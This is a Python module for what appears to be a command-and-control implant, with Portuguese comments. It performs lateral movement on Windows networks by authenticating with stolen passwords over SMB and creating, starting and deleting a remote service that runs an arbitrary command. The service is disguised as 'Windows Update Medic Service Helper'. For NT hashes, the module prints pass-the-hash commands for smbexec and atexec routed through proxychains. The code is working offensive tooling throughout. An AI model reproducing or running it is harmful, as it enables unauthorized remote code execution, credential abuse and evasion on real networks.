    # scm_ext — Anubis agent (MÉTODO da classe anubis)
    # Lateral exec via Service Control Manager (CreateService / StartService)
    # Auth: password (sc \\target + net use) | nthash (melhor esforço + fallback)
    # window: hidden|console | mode: create_start_delete|create_start|start_only|delete_only

    def scm_ext(
        self,
        task_id,
        target="",
        username="",
        password="",
        nthash="",
        domain="",
        command="",
        service_name="",
        display_name="",
        binpath="",
        window="hidden",
        mode="create_start_delete",
        service_type="own",
        start_type="demand",
        delete_after=True,
        force=True,
        socks_port=7005,
    ):
        import os, sys, re, time, tempfile, subprocess, random, string

        def out(msg):
            return str(msg)

        def run(cmd, timeout=120, env=None):
            try:
                r = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    shell=isinstance(cmd, str),
                    env=env,
                )
                return r.returncode, ((r.stdout or "") + (r.stderr or "")).strip()
            except Exception as e:
                return -1, str(e)

        if sys.platform != "win32":
            return out("scm_ext: requer Windows (agente no pivô)")

        target = str(target or "").strip().lstrip("\\")
        username = str(username or "").strip()
        password = str(password or "")
        nthash = str(nthash or "").strip().replace(" ", "")
        domain = str(domain or "").strip()
        command = str(command or "").strip()
        service_name = str(service_name or "").strip()
        display_name = str(display_name or "").strip()
        binpath = str(binpath or "").strip()
        window = str(window or "hidden").lower().strip()
        mode = str(mode or "create_start_delete").lower().strip()
        service_type = str(service_type or "own").lower().strip()
        start_type = str(start_type or "demand").lower().strip()
        if isinstance(delete_after, str):
            delete_after = delete_after.strip().lower() in ("1", "true", "yes", "sim")
        if isinstance(force, str):
            force = force.strip().lower() in ("1", "true", "yes", "sim")
        delete_after = bool(delete_after)
        force = bool(force)

        if not target:
            return out("[-] target obrigatorio")
        if not username:
            return out("[-] username obrigatorio")
        if not password and not nthash:
            return out("[-] informe password e/ou nthash")

        if nthash:
            if ":" in nthash:
                nthash = nthash.split(":")[-1].strip()
            if not re.fullmatch(r"[0-9a-fA-F]{32}", nthash):
                return out("[-] nthash invalido: 32 hex (NT) ou LM:NT")

        if not service_name:
            service_name = "WaaSMedicSvc_%s" % "".join(
                random.choices(string.ascii_lowercase + string.digits, k=4)
            )
        if not display_name:
            display_name = "Windows Update Medic Service Helper"

        # user formats to try for net use
        candidates = []
        if domain and domain not in (".", "WORKGROUP"):
            candidates.append("%s\\%s" % (domain, username))
            candidates.append("%s@%s" % (username, domain))
        candidates.append("%s\\%s" % (target, username))
        candidates.append(".\\%s" % username)
        candidates.append(username)
        # unique preserve order
        seen = set()
        user_list = []
        for u in candidates:
            if u not in seen:
                seen.add(u)
                user_list.append(u)

        # binpath / command
        # sc binPath= precisa aspas se espacos
        if not binpath:
            if not command:
                return out("[-] command ou binpath obrigatorio")
            if window == "console":
                # visivel: cmd /k ou cmd /c
                binpath = 'cmd.exe /c %s' % command
            else:
                # hidden: cmd /c start /B ...
                # Servicos nao tem desktop interativo — "console" quase nunca mostra UI
                binpath = 'cmd.exe /c %s' % command

        # sc.exe exige espaco apos = 
        st_map = {"own": "own", "share": "share", "kernel": "kernel", "filesys": "filesys"}
        start_map = {
            "demand": "demand",
            "auto": "auto",
            "disabled": "disabled",
            "boot": "boot",
            "system": "system",
        }
        st = st_map.get(service_type, "own")
        su = start_map.get(start_type, "demand")

        lines = []
        lines.append(
            "[*] scm_ext target=%s service=%s window=%s mode=%s"
            % (target, service_name, window, mode)
        )
        lines.append("[*] binPath=%s" % binpath[:240])

        ipc = r"\\%s\IPC$" % target
        admin = r"\\%s\ADMIN$" % target
        mapped = False
        used_user = None
        auth_mode = "password" if password else "nthash"
        lines.append("[*] auth=%s" % auth_mode)

        def net_use_add(user, passwd):
            # net use \\host\IPC$ /user:USER PASS
            cmd = ["net", "use", ipc, "/user:%s" % user, passwd]
            return run(cmd, timeout=30)

        def net_use_del():
            run(["net", "use", ipc, "/delete", "/y"], timeout=15)
            run(["net", "use", admin, "/delete", "/y"], timeout=15)

        def sc_remote(args):
            # sc \\target ...
            return run(["sc", "\\\\%s" % target] + args, timeout=90)

        # ── password: net use + sc ───────────────────────────────────────────
        if password:
            last_err = ""
            for u in user_list:
                rc, msg = net_use_add(u, password)
                lines.append("[net use %s] rc=%s %s" % (u, rc, (msg or "")[:200]))
                if rc == 0 or "successfully" in (msg or "").lower() or (
                    rc != 0 and "1219" in (msg or "")
                ):
                    # 1219 = multiple connections same user — often ok to proceed
                    mapped = True
                    used_user = u
                    break
                last_err = msg
            if not mapped and "1219" not in (last_err or ""):
                # still try sc without explicit map (sometimes works)
                lines.append("[!] net use falhou; tentando sc direto")
            else:
                lines.append("[+] sessao SMB: %s" % (used_user or "existente"))

            if mode in ("create_start_delete", "create_start", "create_only"):
                if force:
                    sc_remote(["stop", service_name])
                    sc_remote(["delete", service_name])
                # create
                # sc create name binPath= "..." type= own start= demand
                create_args = [
                    "create",
                    service_name,
                    "binPath=",
                    binpath,
                    "type=",
                    st,
                    "start=",
                    su,
                    "DisplayName=",
                    display_name,
                ]
                rc, msg = sc_remote(create_args)
                lines.append("[create] rc=%s %s" % (rc, (msg or "")[:500]))
                if rc != 0 and "EXISTS" not in (msg or "").upper() and "1073" not in (msg or ""):
                    net_use_del()
                    return out("\n".join(lines + ["[-] create falhou"]))

            if mode in ("create_start_delete", "create_start", "start_only"):
                rc, msg = sc_remote(["start", service_name])
                lines.append("[start] rc=%s %s" % (rc, (msg or "")[:500]))
                # 1053 timeout aspas/binpath; 1056 already running
                if rc != 0 and "1056" not in (msg or "") and "RUNNING" not in (msg or "").upper():
                    lines.append("[!] start retornou erro (servico pode ter executado e saido)")

            if mode in ("create_start_delete", "delete_only") or delete_after:
                time.sleep(2)
                sc_remote(["stop", service_name])
                rc, msg = sc_remote(["delete", service_name])
                lines.append("[delete] rc=%s %s" % (rc, (msg or "")[:300]))

            net_use_del()
            lines.append("[+] concluido (password / sc remoto)")
            return out("\n".join(lines))

        # ── nthash only ──────────────────────────────────────────────────────
        lines.append("[!] nthash: net use / sc nativos NAO aceitam NT hash")
        lines.append("[*] tentando sc \\\\target com token do processo atual...")
        if mode in ("create_start_delete", "create_start", "create_only"):
            if force:
                sc_remote(["stop", service_name])
                sc_remote(["delete", service_name])
            rc, msg = sc_remote(
                [
                    "create",
                    service_name,
                    "binPath=",
                    binpath,
                    "type=",
                    st,
                    "start=",
                    su,
                    "DisplayName=",
                    display_name,
                ]
            )
            lines.append("[create-as-self] rc=%s %s" % (rc, (msg or "")[:500]))
            if rc == 0 or "1073" in (msg or ""):
                if mode != "create_only":
                    rc2, msg2 = sc_remote(["start", service_name])
                    lines.append("[start-as-self] rc=%s %s" % (rc2, (msg2 or "")[:400]))
                if delete_after and mode == "create_start_delete":
                    time.sleep(2)
                    sc_remote(["stop", service_name])
                    sc_remote(["delete", service_name])
                lines.append("[+] scm com credencial do processo atual")
                return out("\n".join(lines))

        # fallback operador
        dom = domain if domain and domain not in (".", "WORKGROUP") else "DOMAIN"
        cmd_esc = command.replace("'", "'\\''")
        bin_esc = binpath.replace("'", "'\\''")
        helper = (
            "\n[*] Fallback com hash (Kali / SOCKS), sem WinRM interativo:\n"
            "  # dominio\n"
            "  proxychains smbexec.py -hashes :{h} '{d}/{u}@{t}'\n"
            "  proxychains atexec.py -hashes :{h} '{d}/{u}@{t}' '{c}'\n"
            "  # local\n"
            "  proxychains atexec.py -hashes :{h} './{u}@{t}' '{c}'\n"
            "  # sc one-shot via atexec (create+start no alvo):\n"
            "  proxychains atexec.py -hashes :{h} '{d}/{u}@{t}' "
            "\"cmd /c sc create {sn} binPath= \\\"{b}\\\" type= own start= demand & sc start {sn}\"\n"
        ).format(
            h=nthash, d=dom, u=username, t=target, c=cmd_esc, sn=service_name, b=bin_esc
        )
        lines.append(helper)
        lines.append("[*] Preferivel: password neste modulo OU GIAAD+hash no smbexec/atexec")
        return out("\n".join(lines))
